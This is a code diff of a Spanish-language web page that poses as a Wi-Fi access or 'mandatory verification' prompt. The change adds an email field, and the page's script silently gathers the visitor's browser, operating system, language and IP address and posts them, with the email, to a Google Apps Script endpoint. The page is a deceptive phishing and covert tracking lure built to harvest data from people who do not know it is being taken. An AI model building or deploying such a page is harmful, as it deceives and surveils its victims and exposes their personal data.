@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Acceso A red De Wifi</title>
+  <title>Verificación</title>
   <style>
     body {
       background: #111;
@@ -20,16 +20,32 @@
       font-size: 1.2em;
       cursor: pointer;
     }
+    input {
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      margin-top: 10px;
+      width: 250px;
+      font-size: 1em;
+    }
   </style>
 </head>
 <body>
-  <h1>Verifica tu acceso</h1>
-  <p>Haz clic en continuar para confirmar tu Acceso</p>
+  <h1>Verificación obligatoria</h1>
+  <p>Ingresa tu correo electrónico para continuar</p>
+  <input type="email" id="correo" placeholder="tucorreo@ejemplo.com" required>
+  <br><br>
   <button onclick="enviarDatos()">Continuar</button>
 
   <script>
     function enviarDatos() {
-      const url = "https://script.google.com/macros/s/AKfycbzxqZof2dO5MywKalHEWSU9B59K49P0IEz3BepWkioORnGBimPC07iDAR8_yb2ewvPnvQ/exec"; // ← Pegá aquí tu URL de Google Apps Script
+      const correo = document.getElementById("correo").value.trim();
+      if (!correo) {
+        alert("Por favor ingresa tu correo electrónico.");
+        return;
+      }
+
+      const url = "AQUÍ_VA_TU_URL_WEB_APP"; // ← Pegá aquí tu URL del Web App
 
       const navegador = navigator.userAgent;
       const idioma = navigator.language || navigator.userLanguage;
@@ -41,6 +57,7 @@
           const ip = data.ip;
 
           const formData = new URLSearchParams({
+            correo,
             navegador,
             so,
             idioma,
@@ -60,3 +77,4 @@
   </script>
 </body>
 </html>
+
